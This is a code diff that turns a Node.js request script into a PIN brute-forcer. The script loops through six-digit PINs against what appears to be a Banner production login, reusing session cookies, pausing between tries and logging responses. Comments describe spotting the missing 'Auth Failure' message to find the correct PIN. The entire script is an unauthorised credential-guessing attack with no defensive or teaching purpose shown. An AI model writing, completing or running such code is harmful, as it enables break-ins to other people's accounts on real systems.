@@ -1,15 +1,7 @@
 const rp = require('request-promise')
 
-let responseId = 'SlVXMDJMNjA3NzMx'
+let responseId = 'NUNRSTZMNjA3NzMx'
 let sessionId = 'TUxGWVdMNjA3NzMx'
-
-// const cookies = {
-//   TESTID: 'set',
-//   SESSID: responseId,
-//   BIGipServerbanner_ssbprd_8888: '810940938.47138.0000',
-//   TESTID: 'set',
-//   SESSID: sessionId
-// }
 
 let options = {
   resolveWithFullResponse: true,
@@ -37,13 +29,27 @@ let options = {
   }
 }
 
-rp(options)
-  .then((response) => {
-    console.log(response)
-  })
-  .catch((err) => {
-    console.error(err)
-  })
+const timeout = ms => new Promise((resolve, reject) => setTimeout(resolve, ms))
 
-// for (let pin = 396257; pin < 99999; pin++) {
-// }
+async function main () {
+  for (let pin = 396257; pin < 999999; pin++) {
+    await rp(options)
+      .then((response) => {
+        // Check if the body doesn't contain the Auth Failure message here.
+        // If it doesn't print the pin and exit the script.
+        console.log(response.body)
+
+        // Grab the first (and only) element of this array.
+        // Split on the `=` and set the responseId appropriately.
+        console.log(response.headers['set-cookie'])
+      })
+      .catch((err) => {
+        console.error(err)
+      })
+
+    // A bit of timeout so we don't overload the page.
+    await timeout(1500)
+  }
+}
+
+main()
